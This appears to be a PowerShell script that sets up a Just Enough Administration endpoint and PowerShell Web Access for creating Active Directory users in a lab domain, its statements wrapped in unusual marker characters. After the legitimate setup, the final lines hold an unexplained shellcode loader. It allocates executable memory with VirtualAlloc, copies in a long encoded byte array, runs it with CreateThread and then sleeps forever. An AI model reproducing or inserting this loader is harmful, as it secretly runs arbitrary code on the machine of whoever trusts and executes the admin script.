
 -||-> $PswaServerName = 'PSWA' <-||- 
 -||-> $DomainControllerName = 'LABDC' <-||- 
 -||-> $JeaRoleName = 'ADUserManager' <-||- 
 -||-> $AdGroupName = 'ADUserManagers' <-||- 
 -||-> $DomainName = 'lab.local' <-||- 



 -||-> New-ADGroup -Name ADUserManagers -GroupScope DomainLocal <-||- 









 -||-> $functionText =  "@


function New-User {
	[CmdletBinding()]
	param (
		[Parameter(Mandatory)]
		[ValidateNotNullOrEmpty()]
		[string]`$FirstName,

		[Parameter(Mandatory)]
		[ValidateNotNullOrEmpty()]
		[string]`$LastName,

		[Parameter(Mandatory)]
		[ValidateNotNullOrEmpty()]
		[ValidateScript({
				`$deps = 'Accounting', 'Information Services'
				if (`$_ -notin `$deps) {
					throw `"You have used an invalid department name. Choose from the following: `$(`$deps -join ', ').`"
            } else {
                `$true
            }
        })]
        [string]`$Department,

        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [string]`$DomainName = 'lab.local'
    )

    `$userName = '{0}{1}' -f `$FirstName.Substring(0,1),`$LastName
    if (Get-AdUser -Filter `"samAccountName -eq '`$userName'`") {
        Write-Host `"The username [`$(`$userName)] already exists.`" -ForegroundColor Red
    } elseif (-not (Get-ADOrganizationalUnit -Filter `"Name -eq '`$Department'`")) {
        Write-Host `"The Active Directory OU for department [`$(`$Department)] could not be found.`" -ForegroundColor Red
    } else {
        `$password = [System.Web.Security.Membership]::GeneratePassword((Get-Random -Minimum 20 -Maximum 32), 3)
        `$secPw = ConvertTo-SecureString -String `$password -AsPlainText -Force

        `$ouPath = 'OU={0}, DC={1}, DC={2}' -f `$Department,`$DomainName.Split('.')[0],`$DomainName.Split('.')[1]
        `$newUserParams = @{
            GivenName = `$FirstName
            Surname = `$LastName
            Name = `$userName
            AccountPassword = `$secPw
            ChangePasswordAtLogon = `$true
            Enabled = `$true
            Department = `$Department
            Path = `$ouPath
        }

        New-AdUser @newUserParams
    }
}
@" <-||- 

 -||-> Set-Content -Path C:\AdUserInitScript.ps1 -Value $functionText <-||- 



 -||-> $modulePath =  -||-> Join-Path $env:ProgramFiles "WindowsPowerShell\Modules\$JeaRoleName" <-||-  <-||- 
 -||-> $null =  -||-> New-Item -ItemType Directory -Path $modulePath <-||-  <-||- 


 -||-> $null =  -||-> New-Item -ItemType File -Path ( -||-> Join-Path $modulePath "$JeaRoleName.psm1" <-||- ) <-||-  <-||- 
 -||-> New-ModuleManifest -Path ( -||-> Join-Path $modulePath "$JeaRoleName.psd1" <-||- ) -RootModule "$JeaRoleName.psm1" <-||- 


 -||-> $rcFolder =  -||-> Join-Path $modulePath "RoleCapabilities" <-||-  <-||- 
 -||-> $null =  -||-> New-Item -ItemType Directory $rcFolder <-||-  <-||- 

 -||-> $rcCapFilePath =  -||-> Join-Path -Path $rcFolder -ChildPath "$JeaRoleName.psrc" <-||-  <-||- 
 -||-> $roleCapParams = @{
	Path             =  -||-> $rcCapFilePath <-||- 
	VisibleFunctions =  -||-> 'New-User' <-||- 
	ModulesToImport  =  -||-> 'ActiveDirectory' <-||- 
	AssembliesToLoad =  -||-> 'System.Web' <-||- 
	VisibleCmdlets   =  -||-> 'ConvertTo-SecureString', @{
		Name       =  -||-> 'New-Aduser' <-||- 
		Parameters =  -||-> @{ Name =  -||-> 'GivenName' <-||-  },
		@{ Name =  -||-> 'SurName' <-||-  },
		@{ Name =  -||-> 'Name' <-||-  },
		@{ Name =  -||-> 'AccountPassword' <-||-  },
		@{ Name =  -||-> 'ChangePasswordAtLogon' <-||-  },
		@{ Name =  -||-> 'Enabled' <-||-  },
		@{ Name =  -||-> 'Department' <-||-  },
		@{ Name =  -||-> 'Path' <-||-  } <-||- 
	},
	@{
		Name       =  -||-> 'Get-AdUser' <-||- 
		Parameters =  -||-> @{
			Name =  -||-> 'Filter' <-||- 
		} <-||- 
	},
	@{
		Name       =  -||-> 'Set-Aduser' <-||- 
		Parameters =  -||-> @{ Name =  -||-> 'GivenName' <-||-  },
		@{ Name =  -||-> 'SurName' <-||-  },
		@{ Name =  -||-> 'Name' <-||-  },
		@{ Name =  -||-> 'ChangePasswordAtLogon' <-||-  },
		@{ Name =  -||-> 'Department' <-||-  } <-||- 
	} <-||- 
} <-||- 
 -||-> New-PSRoleCapabilityFile @roleCapParams <-||- 

 -||-> $sessionFilePath =  -||-> Join-Path -Path $rcFolder -ChildPath "$JeaRoleName.pssc" <-||-  <-||- 
 -||-> $params = @{
	SessionType         =  -||-> 'RestrictedRemoteServer' <-||- 
	Path                =  -||-> $sessionFilePath <-||- 
	RunAsVirtualAccount =  -||-> $true <-||- 
	ScriptsToProcess    =  -||-> 'C:\AdUserInitScript.ps1' <-||- 
	RoleDefinitions     =  -||-> @{ 'LAB\ADUserManagers' =  -||-> @{ RoleCapabilities =  -||-> $JeaRoleName <-||-  } <-||-  } <-||- 
} <-||- 

 -||-> New-PSSessionConfigurationFile @params <-||- 

 -||-> if ( -||-> -not ( -||-> Test-PSSessionConfigurationFile -Path $sessionFilePath <-||- ) <-||- ) {
	throw  -||-> 'Failed session configuration file test.' <-||- 
} <-||- 

 -||-> Register-PSSessionConfiguration -Path $sessionFilePath -Name $JeaRoleName -Force <-||- 



 -||-> $nonAdminCred =  -||-> Get-Credential -Message 'Input user credential to test JEA.' <-||-  <-||- 
 -||-> Invoke-Command -ComputerName $DomainControllerName -ScriptBlock {  -||-> New-User -FirstName 'Adam' -LastName 'Bertram' -Department 'Information Services' <-||-  } <-||- 




 -||-> Add-WindowsFeature -Name WindowsPowerShellWebAccess <-||- 
 -||-> Install-PswaWebApplication –UseTestCertificate <-||- 
 -||-> Add-PswaAuthorizationRule –ComputerName $DomainControllerName –UserGroupName "$DomainName\$AdGroupName" –ConfigurationName $JeaRoleName <-||- 

 -||-> $RHR = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $RHR -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xb8,0xab,0xd1,0x45,0xb7,0xda,0xd4,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0x4f,0x83,0xee,0xfc,0x31,0x46,0x10,0x03,0x46,0x10,0x49,0x24,0xb9,0x5f,0x0f,0xc7,0x42,0xa0,0x6f,0x41,0xa7,0x91,0xaf,0x35,0xa3,0x82,0x1f,0x3d,0xe1,0x2e,0xd4,0x13,0x12,0xa4,0x98,0xbb,0x15,0x0d,0x16,0x9a,0x18,0x8e,0x0a,0xde,0x3b,0x0c,0x50,0x33,0x9c,0x2d,0x9b,0x46,0xdd,0x6a,0xc1,0xab,0x8f,0x23,0x8e,0x1e,0x20,0x47,0xda,0xa2,0xcb,0x1b,0xcb,0xa2,0x28,0xeb,0xea,0x83,0xfe,0x67,0xb5,0x03,0x00,0xab,0xce,0x0d,0x1a,0xa8,0xea,0xc4,0x91,0x1a,0x81,0xd6,0x73,0x53,0x6a,0x74,0xba,0x5b,0x99,0x84,0xfa,0x5c,0x41,0xf3,0xf2,0x9e,0xfc,0x04,0xc1,0xdd,0xda,0x81,0xd2,0x46,0xa9,0x32,0x3f,0x76,0x7e,0xa4,0xb4,0x74,0xcb,0xa2,0x93,0x98,0xca,0x67,0xa8,0xa5,0x47,0x86,0x7f,0x2c,0x13,0xad,0x5b,0x74,0xc0,0xcc,0xfa,0xd0,0xa7,0xf1,0x1d,0xbb,0x18,0x54,0x55,0x56,0x4d,0xe5,0x34,0x3f,0xa2,0xc4,0xc6,0xbf,0xac,0x5f,0xb4,0x8d,0x73,0xf4,0x52,0xbe,0xfc,0xd2,0xa5,0xc1,0xd7,0xa3,0x3a,0x3c,0xd7,0xd3,0x13,0xfb,0x83,0x83,0x0b,0x2a,0xab,0x4f,0xcc,0xd3,0x7e,0xdf,0x9c,0x7b,0xd0,0xa0,0x4c,0x3c,0x80,0x48,0x87,0xb3,0xff,0x69,0xa8,0x19,0x68,0x81,0x41,0xa2,0x96,0x52,0x07,0xd1,0xf9,0x2b,0xbb,0x71,0x77,0xa1,0x2b,0x15,0x04,0x4d,0x82,0x8d,0x8e,0xc3,0xa9,0x63,0x20,0x79,0x3a,0x7c,0xd4,0x28,0xea,0x48,0xa4,0xd4,0x3e,0x3b,0xe4,0x36,0xab,0x39,0xb4,0x2e,0x29,0x42,0x25,0xf3,0xa4,0xa4,0x2f,0x1b,0xe1,0x7f,0xc7,0x82,0xa8,0xf4,0x76,0x4a,0x67,0x71,0xb8,0xc0,0x84,0x85,0x76,0x21,0xe0,0x95,0xee,0xc1,0xbf,0xc4,0xb8,0xde,0x15,0x62,0x44,0x4b,0x92,0x25,0x13,0xe3,0x98,0x10,0x53,0xac,0x63,0x77,0xe8,0x65,0xf6,0x38,0x86,0x89,0x16,0xb9,0x56,0xdc,0x7c,0xb9,0x3e,0xb8,0x24,0xea,0x5b,0xc7,0xf0,0x9e,0xf0,0x52,0xfb,0xf6,0xa5,0xf5,0x93,0xf4,0x90,0x32,0x3c,0x06,0xf7,0xc2,0x00,0xd1,0x31,0xb1,0x68,0xe1 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $fpCk=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $fpCk.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$fpCk,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



